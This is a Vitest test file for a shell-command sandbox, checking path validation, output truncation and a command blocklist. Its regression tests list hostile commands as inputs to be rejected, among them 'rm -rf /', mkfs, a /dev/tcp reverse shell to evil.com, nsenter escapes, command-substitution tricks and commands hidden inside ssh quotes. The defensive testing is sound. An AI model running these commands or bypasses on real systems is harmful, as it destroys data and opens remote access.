import { describe, it, expect } from 'vitest';
import { validateCwd, validateCommand, truncateOutput } from './sandbox.js';

describe('Sandbox', () => {
  it('allows cwd inside allowed prefix', () => {
    const cwd = validateCwd(process.cwd(), { allowedCwdPrefixes: [process.cwd()] });
    expect(cwd).toBe(process.cwd());
  });

  it('rejects cwd outside allowed prefix', () => {
    expect(() => validateCwd('/etc', { allowedCwdPrefixes: [process.cwd()] })).toThrow('outside allowed');
  });

  it('rejects forbidden commands', () => {
    expect(() => validateCommand('rm -rf /', { forbiddenCommands: ['rm -rf /'] })).toThrow('forbidden');
  });

  it('allows safe commands', () => {
    expect(() => validateCommand('echo hello', { forbiddenCommands: ['rm -rf /'] })).not.toThrow();
  });

  it('truncates output over max bytes', () => {
    const big = 'x'.repeat(2000);
    const result = truncateOutput(big, 1000);
    expect(result).toContain('...output truncated...');
    expect(Buffer.byteLength(result, 'utf-8')).toBeLessThanOrEqual(1100);
  });
});

// ── Security regression tests ──

describe('Sandbox — Path Traversal', () => {
  it('rejects cwd with .. traversal', () => {
    const allowed = process.cwd();
    expect(() => validateCwd(`${allowed}/../../etc`, { allowedCwdPrefixes: [allowed] })).toThrow('outside allowed');
  });

  it('rejects absolute path outside allowed prefix', () => {
    expect(() => validateCwd('/etc/passwd', { allowedCwdPrefixes: [process.cwd()] })).toThrow('outside allowed');
  });

  it('rejects root path', () => {
    expect(() => validateCwd('/', { allowedCwdPrefixes: [process.cwd()] })).toThrow('outside allowed');
  });

  it('rejects null bytes in cwd', () => {
    expect(() => validateCwd(`${process.cwd()}\0/etc`, { allowedCwdPrefixes: [process.cwd()] })).toThrow();
  });

  it('allows nested subdirectory inside allowed prefix', () => {
    const allowed = process.cwd();
    const sub = `${allowed}/src`;
    expect(() => validateCwd(sub, { allowedCwdPrefixes: [allowed] })).not.toThrow();
  });
});

describe('Sandbox — Blocklist Bypass Attempts', () => {
  const fullBlocklist = [
    'rm -rf /', 'rm -r -f /', 'rm -rf ~', 'rm -rf *',
    'sudo', 'bash -i', 'sh -i',
    'mkfs', 'reboot', 'shutdown',
    '/dev/tcp/', 'nc -e',
  ];

  it('rejects rm -rf with trailing space', () => {
    expect(() => validateCommand('rm -rf / ', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('rejects rm -rf with extra flags', () => {
    expect(() => validateCommand('rm -r -f /', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('rejects rm -rf with wildcard', () => {
    expect(() => validateCommand('rm -rf /*', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('rejects sudo with arguments', () => {
    expect(() => validateCommand('sudo apt install evil', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('rejects bash -i with preceding env', () => {
    // The regex uses negative lookbehind to catch this
    expect(() => validateCommand('env bash -i', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('rejects null bytes in command', () => {
    expect(() => validateCommand('echo hello\0rm -rf /', { forbiddenCommands: fullBlocklist })).toThrow('null bytes');
  });

  it('rejects mkfs commands', () => {
    expect(() => validateCommand('mkfs.ext4 /dev/sda1', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('rejects reboot commands', () => {
    expect(() => validateCommand('reboot now', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('rejects /dev/tcp/ reverse shell', () => {
    expect(() => validateCommand('echo hi > /dev/tcp/evil.com/4444', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('allows complex but safe commands', () => {
    expect(() => validateCommand('git log --oneline -10 | head -5', { forbiddenCommands: fullBlocklist })).not.toThrow();
  });
});

describe('Sandbox — Shell Metacharacter Detection', () => {
  const fullBlocklist = [
    'rm -rf /', 'rm -r -f /', 'rm -rf ~', 'rm -rf *',
    'sudo', 'bash -i', 'sh -i',
    'mkfs', 'reboot', 'shutdown',
    '/dev/tcp/', 'nc -e',
  ];

  it('rejects backtick command substitution', () => {
    expect(() => validateCommand('echo `whoami`', { forbiddenCommands: fullBlocklist })).toThrow('metacharacter');
  });

  it('rejects $(...) command substitution', () => {
    expect(() => validateCommand('echo $(whoami)', { forbiddenCommands: fullBlocklist })).toThrow('metacharacter');
  });

  it('rejects ${...} variable expansion', () => {
    expect(() => validateCommand('echo ${IFS}rm', { forbiddenCommands: fullBlocklist })).toThrow('metacharacter');
  });

  it('rejects hex escape sequences', () => {
    expect(() => validateCommand('echo \\x72\\x6d', { forbiddenCommands: fullBlocklist })).toThrow('metacharacter');
  });

  it('rejects octal escape sequences', () => {
    expect(() => validateCommand('echo \\162\\155', { forbiddenCommands: fullBlocklist })).toThrow('metacharacter');
  });

  it('rejects process substitution <(...)', () => {
    expect(() => validateCommand('cat <(whoami)', { forbiddenCommands: fullBlocklist })).toThrow('metacharacter');
  });

  it('rejects process substitution >(...)', () => {
    expect(() => validateCommand('echo >(evil)', { forbiddenCommands: fullBlocklist })).toThrow('metacharacter');
  });

  it('allows safe commands without metacharacters', () => {
    expect(() => validateCommand('ls -la /tmp', { forbiddenCommands: fullBlocklist })).not.toThrow();
  });
});

describe('Sandbox — Command Normalization', () => {
  const fullBlocklist = [
    'rm -rf /', 'rm -r -f /', 'rm -rf ~', 'rm -rf *',
    'sudo', 'bash -i', 'sh -i',
    'mkfs', 'reboot', 'shutdown',
    '/dev/tcp/', 'nc -e',
  ];

  it('catches rm -rf with extra whitespace', () => {
    expect(() => validateCommand('rm    -rf    /', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('catches rm -rf with tabs', () => {
    expect(() => validateCommand('rm\t-rf\t/', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('catches rm -rf with line continuation', () => {
    expect(() => validateCommand('rm \\\n-rf \\\n/', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('catches sudo with extra whitespace', () => {
    expect(() => validateCommand('  sudo   apt  ', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });
});

describe('Sandbox — Base Command Detection', () => {
  const fullBlocklist = [
    'rm -rf /', 'rm -r -f /', 'rm -rf ~', 'rm -rf *',
    'sudo', 'bash -i', 'sh -i',
    'mkfs', 'reboot', 'shutdown',
    '/dev/tcp/', 'nc -e',
  ];

  it('catches sudo as first command', () => {
    expect(() => validateCommand('sudo apt update', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('catches reboot as first command', () => {
    expect(() => validateCommand('reboot', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('catches shred as first command', () => {
    expect(() => validateCommand('shred /etc/passwd', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('catches mkfs as first command', () => {
    expect(() => validateCommand('mkfs.ext4 /dev/sda1', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('catches nsenter as first command', () => {
    expect(() => validateCommand('nsenter --target 1 --mount', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('catches unshare as first command', () => {
    expect(() => validateCommand('unshare --pid --fork', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });
});

describe('Sandbox — SSH Command Bypass', () => {
  const fullBlocklist = [
    'rm -rf /', 'rm -r -f /', 'rm -rf ~', 'rm -rf *',
    'sudo', 'bash -i', 'sh -i',
    'mkfs', 'reboot', 'shutdown',
    '/dev/tcp/', 'nc -e',
  ];

  it('validates the full SSH command including content after quotes', () => {
    // This is the known bypass: ssh user@host "rm -rf /"
    // The current implementation only checks before the first quote
    // This test documents the expected behavior — it SHOULD throw
    expect(() => validateCommand('ssh user@host "rm -rf /"', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('validates SSH command with sudo inside quotes', () => {
    expect(() => validateCommand('ssh user@host "sudo apt install evil"', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('validates SSH command with bash -i inside quotes', () => {
    expect(() => validateCommand('ssh user@host "bash -i"', { forbiddenCommands: fullBlocklist })).toThrow('forbidden');
  });

  it('allows SSH commands without dangerous content', () => {
    expect(() => validateCommand('ssh user@host "ls -la"', { forbiddenCommands: fullBlocklist })).not.toThrow();
  });
});
